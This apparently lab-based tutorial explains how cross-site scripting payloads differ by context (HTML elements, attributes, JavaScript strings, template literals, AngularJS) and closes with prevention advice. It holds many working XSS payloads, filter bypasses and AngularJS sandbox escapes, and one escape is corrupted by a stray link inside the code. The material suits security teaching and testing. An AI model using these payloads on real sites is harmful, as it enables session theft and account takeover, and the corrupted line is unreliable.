# Cross-Site Scripting Contexts

Understanding XSS context is fundamental to exploiting and preventing cross-site scripting vulnerabilities—the context determines which characters are interpreted as code versus data, what payload syntax will successfully execute, and which bypass techniques are necessary when filters are present. When testing for reflected and stored XSS, security researchers must first identify where attacker-controllable data appears in the HTTP response, then analyze any validation or processing applied to that data, and finally craft context-appropriate payloads that achieve JavaScript execution. The same input string might be harmless in one context but execute malicious code in another—for example, `<script>alert(1)</script>` works between HTML tags but fails inside a JavaScript string literal where `';alert(1);//` is required instead. Different contexts demand different exploitation techniques: HTML element contexts need angle brackets to create new tags, attribute contexts might require quote characters to break out, JavaScript string contexts need string terminators, and template literal contexts use `${}` syntax for expression injection. Effective XSS testing requires methodically identifying the exact location and processing context of reflected input, then selecting payloads specifically designed for that context while anticipating common filters like angle bracket encoding, quote escaping, or keyword blacklisting.

The core principle: **context determines exploitation strategy**—the same payload that works in one location fails in another.

## Understanding XSS Contexts

### What is XSS context?

**Definition:** The specific location and syntactic environment within an HTTP response where attacker-controllable data appears, which determines what characters and syntax are interpreted as executable code versus display text.

**Why context matters:**

```
Same input, different contexts, different results:

Input: <script>alert(1)</script>

Context 1: HTML element
<div><script>alert(1)</script></div>
Result: ✓ Script executes (creates script element)

Context 2: HTML attribute
<input value="<script>alert(1)</script>">
Result: ✗ No execution (treated as attribute value text)

Context 3: JavaScript string
<script>var x = "<script>alert(1)</script>";</script>
Result: ✗ Syntax error (breaks string, invalid syntax)

Context 4: JavaScript code
<script>var x = <script>alert(1)</script>;</script>
Result: ✗ HTML parser confusion (nested script tags)

Conclusion: Context fundamentally changes exploitation requirements
```

### Context identification process

**Step 1: Locate reflection point**

```
Submit unique test string:
Input: xss_test_k8h3m9

Search HTTP response for: xss_test_k8h3m9

Found locations determine context(s)
```

**Step 2: Analyze surrounding code**

```html
<!-- Example 1: Between HTML tags -->
<h1>Search results for: xss_test_k8h3m9</h1>
Context: HTML element content

<!-- Example 2: Inside HTML attribute -->
<input type="text" value="xss_test_k8h3m9">
Context: HTML attribute value (quoted)

<!-- Example 3: Inside JavaScript string -->
<script>
var search = "xss_test_k8h3m9";
</script>
Context: JavaScript string literal

<!-- Example 4: Inside JavaScript template literal -->
<script>
var message = `Results for: xss_test_k8h3m9`;
</script>
Context: JavaScript template literal

<!-- Example 5: Inside event handler attribute -->
<a href="#" onclick="displaySearch('xss_test_k8h3m9')">
Context: JavaScript string within event handler attribute
```

**Step 3: Determine encoding/filtering**

```
Test special characters:
Input: <>"'`/\

Observe response:
- Are < > encoded as &lt; &gt;?
- Are quotes " ' encoded or escaped?
- Are backslashes added before quotes?
- Are certain characters removed entirely?
- Is input truncated at certain length?

This reveals filtering logic
```

**Step 4: Select context-appropriate payload**

```
Based on context + filters:
- HTML context → HTML tags or entities
- Attribute context → Attribute breaking or event handlers
- JavaScript string → String termination or escaping
- Template literal → ${} expression injection
```

## XSS Between HTML Tags

### Basic HTML element context

**Scenario: Input appears as text content between HTML tags**

**Vulnerable code:**
```php
<?php
$searchTerm = $_GET['search'];
?>
<h1>Results for: <?php echo $searchTerm; ?></h1>
<p>Your search: <?php echo $searchTerm; ?></p>
```

**Context:**
```html
<h1>Results for: USER_INPUT</h1>
<p>Your search: USER_INPUT</p>
```

**Exploitation strategy:**

**Goal:** Introduce new HTML elements that execute JavaScript

**Standard payloads:**
```html
<!-- Script tag (most direct) -->
<script>alert(document.domain)</script>

<!-- Image with error handler -->
<img src=x onerror=alert(1)>

<!-- SVG with onload -->
<svg onload=alert(1)>

<!-- Iframe with javascript: -->
<iframe src=javascript:alert(1)>

<!-- Body onload (if renders outside body) -->
<body onload=alert(1)>

<!-- Video/audio with error handler -->
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Details with ontoggle -->
<details open ontoggle=alert(1)>

<!-- Marquee with onstart -->
<marquee onstart=alert(1)>
```

### Common filter bypasses

**Bypass 1: `<script>` tag blocked**

**Filter removes or encodes `<script>`:**

```javascript
// Try alternative tags
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>

// Case variation (if filter is case-sensitive)
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

// Nested tags (if filter does single-pass replacement)
<scr<script>ipt>alert(1)</scr</script>ipt>

// Null byte injection (some parsers)
<scr\x00ipt>alert(1)</scr\x00ipt>

// HTML encoding (depends on context)
&lt;script&gt;alert(1)&lt;/script&gt;
(Won't work in element context, only in some attribute contexts)
```

**Bypass 2: Event handlers blocked**

**Filter blocks `onclick`, `onerror`, etc.:**

```html
<!-- Try less common event handlers -->
<img src=x onerror=alert(1)>        <!-- Blocked -->
<img src=x onload=alert(1)>          <!-- Try this -->
<body onpageshow=alert(1)>           <!-- Or this -->
<input onfocus=alert(1) autofocus>   <!-- Or this -->
<select onfocus=alert(1) autofocus>  <!-- Or this -->
<textarea onfocus=alert(1) autofocus><!-- Or this -->
<marquee onstart=alert(1)>           <!-- Or this -->
<details open ontoggle=alert(1)>     <!-- Or this -->

<!-- Case variation -->
<img src=x oNeRRoR=alert(1)>

<!-- Event name obfuscation -->
<img src=x on error=alert(1)>  <!-- Space (usually doesn't work) -->
```

**Bypass 3: Most tags and attributes blocked**

**Strict filter allowing only specific tags:**

**Testing methodology:**

```
PortSwigger XSS Cheat Sheet provides filterable tag list

Test systematically:
1. Try common tags: <img> <svg> <iframe> <body> <input>
2. If blocked, try uncommon tags: <object> <embed> <applet>
3. Try custom tags: <xss> <custom> <xyz>
4. Identify what's allowed
```

**Lab scenario: Most tags blocked**

```html
<!-- Standard payloads blocked -->
<script>alert(1)</script>        ✗ Blocked
<img src=x onerror=alert(1)>     ✗ Blocked
<svg onload=alert(1)>            ✗ Blocked

<!-- Find allowed tag using Burp Intruder -->
Test all tags from XSS cheat sheet

<!-- Suppose <body> tag allowed but event handlers blocked -->
<body onload=alert(1)>           ✗ onload blocked

<!-- Try custom tags with allowed events -->
```

**Lab scenario: All standard tags blocked, custom tags allowed**

**Exploit pattern:**

```html
<!-- Custom tags are allowed -->
<custom>test</custom>            ✓ Allowed

<!-- But event handlers blocked? -->
<custom onclick=alert(1)>        ✗ Blocked

<!-- Solution: Use onfocus with tabindex and autofocus -->
<custom id=x onfocus=alert(document.domain) tabindex=1>
</custom>

<!-- Trigger focus with URL hash -->
URL: /?search=<custom id=x onfocus=alert(document.cookie) tabindex=1>#x

Flow:
1. <custom> tag created with onfocus handler
2. tabindex=1 makes element focusable
3. URL hash #x targets element by id
4. Browser automatically focuses element with id="x"
5. onfocus fires
6. alert executes
```

**Alternative with autofocus:**

```html
<!-- Some browsers support autofocus on any element -->
<xss autofocus onfocus=alert(1) tabindex=1>

<!-- Or use access key (requires user interaction) -->
<xss accesskey=x onclick=alert(1)>Click or press Alt+Shift+X</xss>
```

**Lab scenario: Event handlers and href blocked**

**Challenge: No standard JavaScript execution methods**

**Solution: Use SVG animate tags**

```html
<!-- Standard approaches blocked -->
<img onerror=alert(1)>           ✗ Blocked
<a href="javascript:alert(1)">   ✗ Blocked

<!-- SVG <animate> allowed -->
<svg>
  <animate attributeName=href values=javascript:alert(1) />
  <a>
    <text x=20 y=20>XSS</text>
  </a>
</svg>

<!-- When user clicks text, javascript: URL executes -->
```

**Another SVG technique:**

```html
<svg>
  <set attributeName=href to=javascript:alert(1) />
  <a>
    <text x=20 y=20>Click</text>
  </a>
</svg>
```

**Lab scenario: SVG markup allowed**

**Using SVG-specific XSS vectors:**

```html
<!-- Basic SVG XSS -->
<svg onload=alert(1)>            ✗ Blocked

<!-- SVG with <title> and event handler -->
<svg><title onbegin=alert(1)></title></svg>  ✗ May be blocked

<!-- SVG <animatetransform> -->
<svg>
  <animatetransform onbegin=alert(1)>
  </animatetransform>
</svg>

<!-- SVG <animate> with onbegin -->
<svg>
  <animate onbegin=alert(1) attributeName=x dur=1s>
  </animate>
</svg>

<!-- SVG <image> with onerror -->
<svg>
  <image href=x onerror=alert(1)>
  </image>
</svg>

<!-- Test which SVG tags and attributes are allowed -->
```

**Successful payload example:**

```html
<svg>
<animatetransform onbegin=alert(1)></animatetransform>
</svg>

URL-encoded:
/?search=%3Csvg%3E%3Canimatetransform+onbegin%3Dalert(1)%3E%3C%2Fanimatetransform%3E%3C%2Fsvg%3E
```

## XSS in HTML Tag Attributes

### Quoted attribute context

**Scenario: Input reflected inside quoted HTML attribute**

**Vulnerable code:**
```html
<input type="text" value="USER_INPUT">
<img src="image.jpg" alt="USER_INPUT">
<a href="/page" title="USER_INPUT">Link</a>
```

**Exploitation strategy:**

**Goal:** Break out of attribute value and inject new attributes or tags

**Method 1: Close tag and inject new tag**

```html
<!-- Original -->
<input value="USER_INPUT">

<!-- Payload -->
"><script>alert(1)</script>

<!-- Result -->
<input value=""><script>alert(1)</script>">

<!-- Breakdown:
" → Closes value attribute
> → Closes input tag
<script>alert(1)</script> → New script element
Trailing "> → Syntax error but script already executed
-->
```

**Lab example: Reflected XSS into attribute with angle brackets encoded**

```html
<!-- Application encodes < and > -->
Input: "><script>alert(1)</script>
Output: <input value="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">

<!-- Cannot break out of tag with < > -->

<!-- Solution: Inject event handler without < > -->
Payload: " autofocus onfocus=alert(1) x="

Result:
<input value="" autofocus onfocus=alert(1) x="">

Breakdown:
" → Closes value attribute
autofocus → Makes element auto-focus
onfocus=alert(1) → Event handler executes on focus
x=" → Starts new attribute to consume trailing "
```

**Method 2: Event handler injection**

```html
<!-- When angle brackets blocked, inject events -->

<!-- Various event handler payloads -->
" onclick=alert(1) "
" onmouseover=alert(1) "
" onfocus=alert(1) autofocus "
" onblur=alert(1) autofocus onfocus=blur() "
" onerror=alert(1) "

<!-- With attribute repair -->
" autofocus onfocus=alert(document.domain) x="

<!-- On input elements -->
" oninput=alert(1) "

<!-- On change -->
" onchange=alert(1) "
```

**Unquoted attribute context:**

```html
<!-- Input in unquoted attribute -->
<input value=USER_INPUT>

<!-- Easier exploitation (no quotes to close) -->
Payload: x onfocus=alert(1) autofocus

Result:
<input value=x onfocus=alert(1) autofocus>

<!-- Space separates attributes -->
```

### Scriptable attribute contexts

**Attributes that execute JavaScript directly**

**href attribute in anchor/area tags:**

```html
<!-- Vulnerable code -->
<a href="USER_INPUT">Click here</a>

<!-- Exploitation with javascript: protocol -->
Payload: javascript:alert(document.domain)

Result:
<a href="javascript:alert(document.domain)">Click here</a>

<!-- When user clicks, JavaScript executes -->
```

**Lab example: Stored XSS into href with double quotes encoded**

```html
<!-- Application stores comment with website URL -->
Website field: javascript:alert(1)

<!-- Rendered as -->
<a href="javascript:alert(1)">Visit Website</a>

<!-- Double quotes encoded so can't break out -->
<!-- But javascript: protocol executes directly -->

When user clicks link → alert(1) fires
Lab solved!
```

**Other scriptable attributes:**

```html
<!-- src attributes (some contexts) -->
<iframe src="javascript:alert(1)">
<embed src="javascript:alert(1)">

<!-- action attribute -->
<form action="javascript:alert(1)">
  <input type="submit" value="Submit">
</form>

<!-- formaction attribute -->
<form>
  <input type="submit" formaction="javascript:alert(1)" value="Submit">
</form>

<!-- data attribute (object/embed) -->
<object data="javascript:alert(1)">
<embed data="javascript:alert(1)">
```

### Access keys and hidden input exploitation

**Canonical link tag XSS:**

**Scenario: Reflection in `<link>` tag with angle brackets encoded**

**Vulnerable code:**
```php
<head>
  <link rel="canonical" href="https://site.com<?php echo $_GET['param']; ?>"/>
</head>
```

**Challenge:**
```
- Reflected in <head> (not visible to user)
- Angle brackets encoded (can't break out of tag)
- User can't interact with <link> element

Need: Way to trigger JavaScript without user seeing element
```

**Solution: accesskey attribute**

```html
<!-- Inject accesskey and onclick -->
Payload: ?'accesskey='x'onclick='alert(1)

Rendered:
<link rel="canonical" href="https://site.com/?" accesskey="x" onclick="alert(1)" '="" />

Breakdown:
? → Starts query string
' → Closes href attribute value
accesskey='x' → Sets X as access key
onclick='alert(1) → Click handler
Trailing ' consumed by existing HTML
```

**Triggering the access key:**

```
Browser keyboard shortcuts:
- Chrome/Linux: Alt+X
- Chrome/Windows: Alt+X  
- Chrome/Mac: Control+Option+X
- Firefox/Windows: Alt+Shift+X
- Firefox/Mac: Control+Option+X
- Safari/Mac: Control+Option+X

When user presses access key combination:
onclick event fires → alert(1) executes
```

**Lab solution:**

```
URL: /?'accesskey='x'onclick='alert(1)

Press: Alt+Shift+X (or browser-specific combination)

Result: Alert fires despite element being in <head>
Lab solved!
```

**Hidden input field XSS:** 

```html
<!-- Hidden input with reflection -->
<input type="hidden" value="USER_INPUT">

<!-- Standard XSS won't work (element hidden) -->

<!-- Solution: accesskey + onclick -->
Payload: " accesskey="x" onclick="alert(1)

Result:
<input type="hidden" value="" accesskey="x" onclick="alert(1)">

<!-- Press access key to trigger onclick despite hidden -->
```

### HTML entity encoding in event handlers

**Bypassing filters with HTML entities**

**Scenario: XSS context inside event handler attribute, quotes filtered**

**Vulnerable code:**
```php
<a href="#" onclick="displayName('<?php echo addslashes($_GET['name']); ?>')">
```

**Normal payload blocked:**
```
Input: '); alert(1);//
Processed: addslashes adds backslash
Output: onclick="displayName('\'); alert(1);//')"
Result: Syntax error (backslash escapes quote)
```

**Solution: HTML entity encoding** 

```html
<!-- Browser HTML-decodes attribute values BEFORE JavaScript execution -->

Payload: &apos;-alert(document.domain)-&apos;

Server processes:
- addslashes doesn't affect &apos; (not a quote)
- Stores: &apos;-alert(document.domain)-&apos;

Rendered:
<a href="#" onclick="displayName('&apos;-alert(document.domain)-&apos;')">

Browser HTML-decodes:
&apos; → '

JavaScript sees:
onclick="displayName(''-alert(document.domain)-'')"

Executes:
displayName('');  // Empty call
-alert(document.domain);  // Executes!
-'';  // Negative of empty string
```

**HTML entities for bypass:**

```html
<!-- Single quote -->
&apos;   → '
&#39;    → '
&#x27;   → '

<!-- Double quote -->
&quot;   → "
&#34;    → "
&#x22;   → "

<!-- Less than -->
&lt;     → <
&#60;    → <
&#x3c;   → <

<!-- Greater than -->
&gt;     → >
&#62;    → >
&#x3e;   → >

<!-- Ampersand (might need double encoding) -->
&amp;    → &
```

**Lab example: onclick with encoded quotes and escaped single quotes**

```html
<!-- Server-side processing -->
- Encodes < > " in HTML
- Escapes ' and \ with backslashes

<!-- Vulnerable code -->
<a href="#" onclick="tracker.push('USER_INPUT')">

<!-- Standard approach fails -->
'); alert(1);// → \'); alert(1);//

<!-- HTML entity approach -->
&apos;);alert(1);// → Works!

<!-- Because: -->
1. Server doesn't escape &apos; (not a quote character)
2. Browser HTML-decodes &apos; to ' in attribute
3. JavaScript interprets decoded '
4. String terminated, alert executes
```

## XSS into JavaScript

### Terminating the existing script

**Scenario: Input inside `<script>` block, can close script tag**

**Vulnerable code:**
```html
<script>
var searchTerm = 'USER_INPUT';
processSearch(searchTerm);
</script>
```

**Exploitation strategy:**

**Close script tag and inject new HTML:**

```html
<!-- Payload -->
</script><img src=x onerror=alert(1)>

<!-- Result -->
<script>
var searchTerm = '</script><img src=x onerror=alert(1)>';
processSearch(searchTerm);
</script>

<!-- Browser HTML parsing: -->
1. Sees <script> tag open
2. Sees </script> (closes script tag)
3. Remaining '; becomes invalid JS but script already closed
4. Sees <img src=x onerror=alert(1)>
5. Creates img element, onerror fires

Note: Browser HTML-parses first, then JavaScript-parses
So </script> closes tag even if inside string literal
```

**Why it works:**

```
HTML parsing happens BEFORE JavaScript parsing

Step 1: HTML Parser
<script>
var searchTerm = '</script><img src=x onerror=alert(1)>';
processSearch(searchTerm);
</script>

HTML parser sees:
- <script> → Script block start
- </script> → Script block end (doesn't care about JS strings!)
- <img...> → Image element

Step 2: JavaScript Parser
<script>
var searchTerm = '
</script>

Syntax error! But script already closed by HTML parser
JavaScript error doesn't prevent subsequent HTML parsing

Step 3: Browser continues with HTML
<img src=x onerror=alert(1)>
Creates image, fires onerror, executes alert
```

### Breaking out of JavaScript strings

**Single-quoted string context:**

**Vulnerable code:**
```html
<script>
var input = 'USER_INPUT';
</script>
```

**Exploitation:**

```javascript
// Payload 1: Simple string termination with semicolon
';alert(document.domain);//

// Result:
var input = '';alert(document.domain);//';

// Breakdown:
' → Closes string
; → Ends statement
alert(document.domain); → New statement
// → Comments out trailing code

// Payload 2: String termination with minus operators
'-alert(1)-'

// Result:
var input = ''-alert(1)-'';

// Breakdown:
'' → Empty string
-alert(1) → Negative of alert return value (executes alert)
-'' → Negative of empty string
All becomes valid expression
```

**Double-quoted string context:**

```javascript
// Vulnerable code
<script>
var input = "USER_INPUT";
</script>

// Payload
";alert(1);//

// Result
var input = "";alert(1);//";
```

### Handling backslash escaping

**Scenario 1: Single quotes escaped**

**Vulnerable code:**
```php
<script>
var input = '<?php echo addslashes($_GET['input']); ?>';
</script>
```

**Standard payload fails:**
```javascript
Input: ';alert(1);//
Processed: \';alert(1);//
Result: var input = '\';alert(1);//';
// Backslash escapes quote, no string termination
```

**Solution: Backslash neutralization**

```javascript
// Payload: Add backslash before quote
\';alert(1);//

// Server processing:
Input: \';alert(1);//
addslashes() adds \ before '
Result: \\';alert(1);//

// JavaScript interprets:
var input = '\\';alert(1);//';

// Breakdown:
\\ → Single literal backslash
' → String terminator (not escaped!)
;alert(1); → Executes
// → Comments rest
```

**Lab example: Single quote and backslash escaped**

```html
<script>
var searchQuery = 'USER_INPUT';
</script>

<!-- Server escapes ' to \' and \ to \\ -->

<!-- Payload -->
</script><img src=1 onerror=alert(1)>

<!-- Why this works -->
- Even with escaping, </script> closes script tag
- HTML parsing happens before JavaScript parsing
- Subsequent <img> tag executes

Lab solved with: </script><img src=1 onerror=alert(1)>
```

**Scenario 2: Angle brackets encoded, single quotes escaped**

```html
<script>
var input = 'USER_INPUT';
</script>

<!-- < > encoded, can't use </script> -->
<!-- ' escaped with backslash -->

<!-- Solution: Backslash neutralization -->
Payload: \';alert(1);//

Result:
var input = '\\';alert(1);//';

<!-- First backslash escapes second backslash -->
<!-- Quote becomes string terminator -->
<!-- alert executes -->
```

### Bypassing parentheses restrictions

**Scenario: Parentheses () blocked or filtered**

**Technique: Exception handling with throw**

**Concept:**
```javascript
// Normal function call
alert(1);  // ✗ Uses parentheses

// Using exception handler
onerror = alert;  // Assign alert to onerror handler
throw 1;          // Throw exception with value 1
                  // onerror catches exception
                  // Calls alert(1)

// Result: alert function called with argument 1, no parentheses!
```

**Practical exploitation:**

```javascript
// Vulnerable context
javascript:USER_INPUT

// Standard payload blocked
javascript:alert(1)  // ✗ Parentheses blocked

// Alternative with throw
javascript:onerror=alert;throw 1

// Step-by-step:
1. onerror=alert → Sets global error handler to alert function
2. throw 1 → Throws exception with value 1
3. onerror handler called with exception value
4. alert(1) executes
```

**Other techniques without parentheses:**

```javascript
// Using eval
eval`alert\x281\x29`
// Backticks as function call, hex-encoded parentheses

// Using template literal coercion
alert`1`
// Backticks call function with array

// Using with statement
with(document)location=URL
// Depends on context

// Using tagged template literals
alert`${1}`
```

**Lab scenario: JavaScript URL with characters blocked**

```html
<a href="javascript:USER_INPUT">

<!-- Blocked: ( ) ; -->
<!-- Solution using throw -->

Payload: onerror=alert;throw 1

Result:
<a href="javascript:onerror=alert;throw 1">

Click link:
1. onerror=alert assigns function
2. throw 1 triggers exception
3. Exception caught by onerror
4. alert(1) executes

Lab solved!
```

### JavaScript template literals

**Template literal syntax:**

```javascript
// Regular strings use quotes
var msg1 = "Hello";
var msg2 = 'Hello';

// Template literals use backticks
var msg3 = `Hello`;

// Template literals support embedded expressions
var name = "Alice";
var greeting = `Hello, ${name}!`;
// Result: "Hello, Alice!"

// Expressions can be any JavaScript
var result = `2 + 2 = ${2+2}`;
// Result: "2 + 2 = 4"
```

**Vulnerable code:**

```html
<script>
var input = `USER_INPUT`;
</script>
```

**Exploitation:**

```javascript
// No need to close backtick!
// Just inject ${} expression

Payload: ${alert(document.domain)}

Result:
var input = `${alert(document.domain)}`;

// Execution:
1. Template literal evaluated
2. ${...} expression executed
3. alert(document.domain) runs
4. Return value inserted into string
```

**Lab example: Template literal with extensive escaping**

**Scenario:**
```html
<script>
var message = `0 search results for 'USER_INPUT'`;
document.getElementById('searchMessage').innerText = message;
</script>

Server escapes:
- Angle brackets < >
- Single quotes '
- Double quotes "
- Backslashes \
- Backticks ` (Unicode-escaped)
```

**Solution:**

```javascript
// Despite all escaping, ${} expression works!

Payload: ${alert(1)}

Rendered:
var message = `0 search results for '${alert(1)}'`;

// Template literal evaluates ${alert(1)}
// alert executes
// Return value (undefined) inserted

Lab solved with: ${alert(1)}
```

**Why it works:**

```javascript
// ${ } is NOT escaped/encoded
// It's fundamental template literal syntax
// Browser evaluates expression regardless of surrounding characters

Input: ${alert(1)}
No special characters to escape:
- $ is allowed
- { } are allowed
- alert and (1) are allowed

Template literal evaluation:
`...${alert(1)}...`
     ↑ Expression evaluates
     ↑ alert() called
     ↑ Inserts return value
```

## Client-Side Template Injection

### AngularJS XSS

**How AngularJS works:**

```html
<!-- AngularJS processes pages with ng-app attribute -->
<html ng-app>
  <script src="angular.js"></script>
  <body>
    <!-- Expressions in {{}} are evaluated -->
    <p>2 + 2 = {{2+2}}</p>
    <!-- Renders: 2 + 2 = 4 -->
    
    <p>Name: {{user.name}}</p>
    <!-- Renders value from scope -->
  </body>
</html>
```

**Vulnerable scenario:**

**Server reflects input into AngularJS context:**

```html
<!DOCTYPE html>
<html ng-app>
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
</head>
<body>
  <h1>Search Results</h1>
  <!-- Server reflects search parameter -->
  <p>You searched for: <?php echo htmlspecialchars($_GET['search']); ?></p>
</body>
</html>
```

**Exploitation despite HTML encoding:**

```javascript
// Standard XSS blocked by htmlspecialchars
Input: <script>alert(1)</script>
Output: &lt;script&gt;alert(1)&lt;/script&gt;
Result: No execution

// BUT AngularJS expressions use {{}} not <>
Input: {{constructor.constructor('alert(1)')()}}

Output (HTML-encoded):
<p>You searched for: {{constructor.constructor('alert(1)')()}}</p>

// HTML encoding doesn't affect {{}}!
// AngularJS evaluates the expression:
1. {{...}} detected by AngularJS
2. constructor.constructor returns Function constructor
3. Function('alert(1)') creates function
4. () executes function
5. alert(1) fires

Result: XSS despite HTML encoding!
```

**Common AngularJS XSS payloads:**

```javascript
// Basic expression
{{2+2}}  // Test if AngularJS active

// Alert via constructor
{{constructor.constructor('alert(1)')()}}

// Using $on.constructor
{{$on.constructor('alert(1)')()}}

// Using $eval.constructor
{{$eval.constructor('alert(1)')()}}

// Property access variations
{{toString.constructor.prototype.toString.constructor('alert(1)')()}}

// Using window
{{this['constructor']['constructor']('alert(1)')()}}
```

**Lab example: AngularJS expression with HTML encoding**

```html
<!-- Angle brackets and quotes HTML-encoded -->
<body ng-app>
  <h1>Search</h1>
  <p>0 results for '<?= htmlspecialchars($_GET['search']) ?>'</p>
</body>

<!-- Solution -->
Payload: {{$on.constructor('alert(1)')()}}

URL: /?search={{$on.constructor('alert(1)')()}}

Result:
<p>0 results for '{{$on.constructor('alert(1)')()}}'</p>

AngularJS evaluates expression → alert fires
Lab solved!
```

### AngularJS sandbox escapes 

**AngularJS sandbox (older versions):**

```javascript
// AngularJS sandbox tries to prevent dangerous operations
// Blocks: window, document, Function, constructor, etc.

// Bypass techniques for sandbox escape
```

**Sandbox escape example:**

```javascript
// Override native functions
{{
'a'.constructor.prototype.charAt=[].join;
$eval('x=1} } };alert(1)//');
}}

// Explanation:
1. Override charAt function with join
2. AngularJS sandbox uses charAt for validation
3. Overriding charAt breaks sandbox
4. $eval can now execute arbitrary code
```

**Advanced sandbox escape (no strings):**

```javascript
// Challenge: No string literals allowed
// Solution: Construct string with toString

{{
toString.constructor.prototype.charAt=[].join;
 [portswigger](https://portswigger.net/web-security/cross-site-scripting/contexts)|orderBy:toString.constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
}}

// Explanation:
1. Override charAt to break sandbox
2. Use fromCharCode to construct 'x=alert(1)' without string
3. orderBy filter executes constructed code
```

**Lab scenario: Sandbox escape without strings**

```html
<body ng-app>
  <!-- Input reflected, sandbox active, no strings allowed -->
</body>

<!-- Solution using toString() -->
{{
toString.constructor.prototype.charAt=[].join;
[1,2]|orderBy:toString.constructor.fromCharCode(97,108,101,114,116,40,49,41)
}}

// fromCharCode(97,108,101,114,116,40,49,41) = 'alert(1)'
// orderBy executes the constructed expression
```

## Context-Specific Testing Strategy

### Systematic testing approach

**Step 1: Submit test payload**

```
Universal test string (covers multiple contexts):
xss'"<svg/onload=alert(1)>

Tests:
- HTML element context: <svg/onload=alert(1)>
- Attribute context: ' and " quote characters
- General detection: xss prefix
```

**Step 2: Search response for reflection**

```
Browser DevTools:
1. F12 → Elements tab
2. Ctrl+F
3. Search: xss
4. Examine each occurrence
```

**Step 3: Identify context(s)**

```html
<!-- Context 1: Between tags -->
<div>xss'"<svg/onload=alert(1)></div>

<!-- Context 2: Quoted attribute -->
<input value="xss'"<svg/onload=alert(1)>">

<!-- Context 3: Unquoted attribute -->
<input value=xss'"<svg/onload=alert(1)>>

<!-- Context 4: JavaScript string -->
<script>var x = "xss'"<svg/onload=alert(1)>";</script>

<!-- Context 5: Event handler attribute -->
<a onclick="fn('xss'"<svg/onload=alert(1)>')">

<!-- Multiple contexts possible! -->
```

**Step 4: Test context-specific payloads**

```
HTML element → <script>alert(1)</script> or <img src=x onerror=alert(1)>
Quoted attribute → " onfocus=alert(1) autofocus x="
Unquoted attribute → onfocus=alert(1) autofocus
JS string → ';alert(1);//
JS template literal → ${alert(1)}
Event handler → &apos;-alert(1)-&apos;
Scriptable attribute → javascript:alert(1)
```

**Step 5: Iterate and bypass filters**

```
Test systematic variations:
1. If <script> blocked → Try <img> <svg> <iframe>
2. If event handlers blocked → Try less common ones
3. If quotes blocked → Try HTML entities
4. If parentheses blocked → Try throw onerror
5. If syntax blocked → Try encoding/obfuscation
```

### Filter bypass techniques summary

**Character encoding:**

```javascript
// HTML entities
&lt; &gt; &quot; &apos;

// JavaScript Unicode escapes
\u0061lert(1)  // alert(1)

// JavaScript hex escapes
\x61lert(1)  // alert(1)

// URL encoding (depends on processing)
%3Cscript%3E

// Double encoding
%253Cscript%253E
```

**Case variation:**

```html
<ScRiPt>alert(1)</ScRiPt>
<iMg sRc=x oNeRrOr=alert(1)>
```

**Whitespace variations:**

```html
<img src=x onerror=alert(1)>
<img  src=x  onerror=alert(1)>
<img/src=x/onerror=alert(1)>
<img
src=x
onerror=alert(1)>
```

**Alternative syntax:**

```javascript
// Instead of alert(1)
(alert)(1)
window['alert'](1)
top['alert'](1)
parent['alert'](1)
self['alert'](1)
this['alert'](1)
frames['alert'](1)

// Instead of using parentheses
alert`1`
onerror=alert;throw 1

// Instead of quotes
String.fromCharCode(88,83,83)
```

**Nested encoding:**

```html
<!-- If single-pass filter -->
<scr<script>ipt>alert(1)</scr</script>ipt>
```

## Prevention Best Practices

### Context-aware output encoding

**HTML context encoding:**

```php
<?php
// Encode for HTML context
function encodeHTML($input) {
    return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

$userInput = $_GET['search'];
?>
<div><?php echo encodeHTML($userInput); ?></div>
```

**JavaScript string context encoding:**

```javascript
function encodeJavaScript(str) {
    return str
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r')
        .replace(/</g, '\\x3c')
        .replace(/>/g, '\\x3e');
}

// Use in template
<script>
var userName = '<?= encodeJavaScript($userName) ?>';
</script>
```

**Attribute context encoding:**

```php
<?php
// For attributes, use HTML encoding
$userInput = $_GET['name'];
?>
<input value="<?php echo htmlspecialchars($userInput, ENT_QUOTES); ?>">
```

**URL context encoding:**

```python
from urllib.parse import quote

user_input = request.args.get('redirect')
safe_url = quote(user_input, safe='')
```

**Never put untrusted data in:**
- Script tags directly
- Event handler attributes
- CSS values
- Tag names or attribute names

### Use security libraries

```javascript
// DOMPurify for HTML sanitization
import DOMPurify from 'dompurify';

const userHTML = req.body.comment;
const clean = DOMPurify.sanitize(userHTML);
element.innerHTML = clean;

// Template engines with auto-escaping
// React (JSX auto-escapes)
<div>{userInput}</div>  // Safe by default

// Vue.js (template escapes)
<div>{{ userInput }}</div>  // Safe by default

// Angular (template escapes)
<div>{{userInput}}</div>  // Safe by default
```

### Content Security Policy

```javascript
// Strict CSP prevents inline scripts
res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'nonce-RANDOM'; " +
    "object-src 'none';"
);

// Even if XSS exists, CSP blocks execution
<script>alert(1)</script>  // Blocked (no nonce)
```
